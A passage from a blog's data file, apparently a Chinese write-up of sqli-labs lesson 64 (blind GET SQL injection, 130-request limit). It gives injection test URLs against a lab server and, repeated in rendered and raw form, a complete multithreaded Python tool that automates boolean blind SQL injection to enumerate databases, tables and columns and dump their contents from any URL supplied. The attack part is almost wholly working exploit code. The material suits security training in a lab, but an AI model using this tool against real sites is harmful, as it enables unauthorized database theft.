(</span><br><span class=\"line\">        coname, dbname, tbname, i)</span><br><span class=\"line\">    payload += <span class=\"string\">\" %d,1))&gt;%d--+\"</span></span><br><span class=\"line\">    lenth = binary_search_db(url, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]当前字段`%s`长度: %d'</span> % (coname, lenth))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 获取字段值</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_data</span><span class=\"params\">(url, coname, tbname, dbname, count)</span>:</span></span><br><span class=\"line\">    lenth = get_data_len(url, coname, tbname, dbname, count)</span><br><span class=\"line\">    data = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(lenth):</span><br><span class=\"line\">        payload = head + <span class=\"string\">\" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\"</span> % (</span><br><span class=\"line\">            coname, dbname, tbname, count, i + <span class=\"number\">1</span>)</span><br><span class=\"line\">        data += and_method(url, payload)</span><br><span class=\"line\">        print(<span class=\"string\">'[-]当前猜解'</span>, data)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dump</span><span class=\"params\">(url, tbname, dbname, coname=None)</span>:</span></span><br><span class=\"line\">    num = get_data_num(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> coname <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        columns = get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        columns = coname.split(<span class=\"string\">\",\"</span>)</span><br><span class=\"line\">    print(columns)</span><br><span class=\"line\">    datas = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">            data = get_data(url, column, tbname, dbname, i)</span><br><span class=\"line\">            datas.append(data)</span><br><span class=\"line\">        datas.append(<span class=\"string\">'.'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    res = [s.split() <span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> <span class=\"string\">' '</span>.join(datas).split(<span class=\"string\">'.'</span>) <span class=\"keyword\">if</span> s]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> i:</span><br><span class=\"line\">            print(<span class=\"string\">'%-15s'</span> % j, end=<span class=\"string\">''</span>)</span><br><span class=\"line\">        print(<span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    parser = OptionParser()</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-u'</span>, <span class=\"string\">'--url'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'url'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-D'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'db'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-T'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'tbl'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table(s) to enumerate'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'-C'</span>, type=<span class=\"string\">'string'</span>, dest=<span class=\"string\">'col'</span>,</span><br><span class=\"line\">                      help=<span class=\"string\">'DBMS database table column(s) to enumerate, use like id,password'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--current-db'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'cudbs'</span>, help=<span class=\"string\">'Retrieve DBMS current database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dbs'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dbs'</span>, help=<span class=\"string\">'Enumerate ALL database'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--tables'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'tables'</span>, help=<span class=\"string\">'Enumerate DBMS database tables'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--columns'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'columns'</span>, help=<span class=\"string\">'Enumerate DBMS database table columns'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'dump'</span>, help=<span class=\"string\">'Dump DBMS database table entries'</span>)</span><br><span class=\"line\">    parser.add_option(<span class=\"string\">'--dump-all'</span>, action=<span class=\"string\">'store_true'</span>,</span><br><span class=\"line\">                      dest=<span class=\"string\">'all'</span>, help=<span class=\"string\">'Dump all DBMS databases tables entries'</span>)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> options.url <span class=\"keyword\">and</span> options.dbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        getdbname(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.cudbs:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        get_cu_db_name(url)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tables:</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        get_table_name(url, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.col <span class=\"keyword\">and</span> options.dump):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        coname = options.col</span><br><span class=\"line\">        dump(url, tbname, dbname, coname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.all):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        dump(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> (options.url <span class=\"keyword\">and</span> options.db <span class=\"keyword\">and</span> options.tbl <span class=\"keyword\">and</span> options.columns):</span><br><span class=\"line\">        url = options.url</span><br><span class=\"line\">        dbname = options.db</span><br><span class=\"line\">        tbname = options.tbl</span><br><span class=\"line\">        get_column_name(url, tbname, dbname)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        parser.print_help()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n"},{"title":"sqli-labs lession-64 GET-盲注-变化3-仅允许130次请求","date":"2018-11-29T06:05:36.000Z","_content":"\n# sqli-labs lession-64 GET-盲注-变化3-仅允许130次请求\n\n---\n\n## 注入\n\n`'`,`\"`,`')`,`\")`,`))`常用案例依次测试。\n\n`http://10.60.17.35:8082/Less-64/?id=1))+and+1=1%23`\n\n`http://10.60.17.35:8082/Less-64/?id=1))+and+1=2%23`\n\n## 脚本\n\n![001](/img/sql/Lesson-64/001.png)\n\n![002](/img/sql/Lesson-64/002.png)\n\n![003](/img/sql/Lesson-64/003.png)\n\n![004](/img/sql/Lesson-64/004.png)\n\n```\n#python3\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nfeature = 'Your Login name'\nhead = \"))\"\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef binary_search_db(url, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).text\n            if feature in html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n# 获取当前数据库长度\n\n\ndef get_db_len(url):\n    payload = head + \\\n        \" AND ORD(MID((SELECT LENGTH(database())),%d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前数据库长度: %d' % lenth)\n    return lenth\n\n# 获取当前数据库名\n\n\ndef get_cu_db_name(url):\n    lenth = get_db_len(url)\n    dbname = \"\"\n    for i in range(lenth):\n        payload = head + \\\n            \" and ascii(substr((select database()),%d,1))\" % (i + 1)\n        dbname += and_method(url, payload)\n        print('[-]当前猜解', dbname)\n    print('[*]', dbname)\n\n\ndef getdbnum(url):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).text\n        if feature in html:\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d--+\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\n\ndef getdbname(url):\n    num = getdbnum(url)\n    lenth = get_all_db_len(url, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d--+\"\n    # print(payload)\n    num = binary_search_db(url, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, dbname):\n    num = get_table_num(url, dbname)\n    lenth = get_all_table_len(url, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \\\n                \" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, tbname, dbname):\n    num = 0\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, tbname, dbname):\n    num = get_column_num(url, tbname, dbname)\n    lenth = get_all_columns_len(url, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, tbname, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, coname, tbname, dbname, i):\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, coname, tbname, dbname, count):\n    lenth = get_data_len(url, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = head + \" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, tbname, dbname, coname=None):\n    num = get_data_num(url, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--current-db', action='store_true',\n                      dest='cudbs', help='Retrieve DBMS current database')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url)\n    elif options.url and options.cudbs:\n        url = options.url\n        get_cu_db_name(url)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n","source":"_posts/sqli-labs-lession-64-GET-盲注-变化3-仅允许130次请求.md","raw":"---\ntitle: sqli-labs lession-64 GET-盲注-变化3-仅允许130次请求\ndate: 2018-11-29 14:05:36\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-64 GET-盲注-变化3-仅允许130次请求\n\n---\n\n## 注入\n\n`'`,`\"`,`')`,`\")`,`))`常用案例依次测试。\n\n`http://10.60.17.35:8082/Less-64/?id=1))+and+1=1%23`\n\n`http://10.60.17.35:8082/Less-64/?id=1))+and+1=2%23`\n\n## 脚本\n\n![001](/img/sql/Lesson-64/001.png)\n\n![002](/img/sql/Lesson-64/002.png)\n\n![003](/img/sql/Lesson-64/003.png)\n\n![004](/img/sql/Lesson-64/004.png)\n\n```\n#python3\nimport requests\nimport re\nimport threading\nfrom optparse import OptionParser\n\nfeature = 'Your Login name'\nhead = \"))\"\nheaders = {\n    'user-agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'}\n\n\ndef getpayload(url, payload):\n    return url + payload\n\n\ndef binary_search_db(url, payload):\n    i = 1\n    s = \"\"\n    while 1:\n        count = 0\n        mid = 0\n        low = 47\n        high = 57\n        while low <= high:\n            mid = int((low + high) / 2)\n            newpayload = payload % (i, mid)\n            html = requests.get(getpayload(url, newpayload),\n                                headers=headers).text\n            if feature in html:\n                low = mid + 1\n                count += 1\n            else:\n                high = mid - 1\n        if count != 0:\n            s = s + chr(int((low + high + 1) / 2))\n            i = i + 1\n        else:\n            break\n    return int(s)\n\n# 获取当前数据库长度\n\n\ndef get_db_len(url):\n    payload = head + \\\n        \" AND ORD(MID((SELECT LENGTH(database())),%d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前数据库长度: %d' % lenth)\n    return lenth\n\n# 获取当前数据库名\n\n\ndef get_cu_db_name(url):\n    lenth = get_db_len(url)\n    dbname = \"\"\n    for i in range(lenth):\n        payload = head + \\\n            \" and ascii(substr((select database()),%d,1))\" % (i + 1)\n        dbname += and_method(url, payload)\n        print('[-]当前猜解', dbname)\n    print('[*]', dbname)\n\n\ndef getdbnum(url):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]数据库数 [%d]' % num)\n    return num\n\n\ndef get_all_db_len(url, num):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 取与法\n\n\ndef and_method(url, payload):\n    two = [1, 2, 4, 8, 16, 32, 64, 128]\n    s = 0\n    keys = []\n    thread = []\n    m = []\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).text\n        if feature in html:\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d--+\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\n\ndef getdbname(url):\n    num = getdbnum(url)\n    lenth = get_all_db_len(url, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d--+\"\n    # print(payload)\n    num = binary_search_db(url, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \\\n            \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, dbname):\n    num = get_table_num(url, dbname)\n    lenth = get_all_table_len(url, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \\\n                \" and ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, tbname, dbname):\n    num = 0\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d--+\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, tbname, dbname):\n    num = get_column_num(url, tbname, dbname)\n    lenth = get_all_columns_len(url, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = head + \" and ascii(substr((select column_name from information_schema.columns where table_name='%s' and table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, tbname, dbname):\n    num = 0\n    payload = head + \\\n        \" AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d--+\"\n    num = binary_search_db(url, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, coname, tbname, dbname, i):\n    payload = head + \" AND ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d--+\"\n    lenth = binary_search_db(url, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, coname, tbname, dbname, count):\n    lenth = get_data_len(url, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = head + \" and ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, tbname, dbname, coname=None):\n    num = get_data_num(url, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for 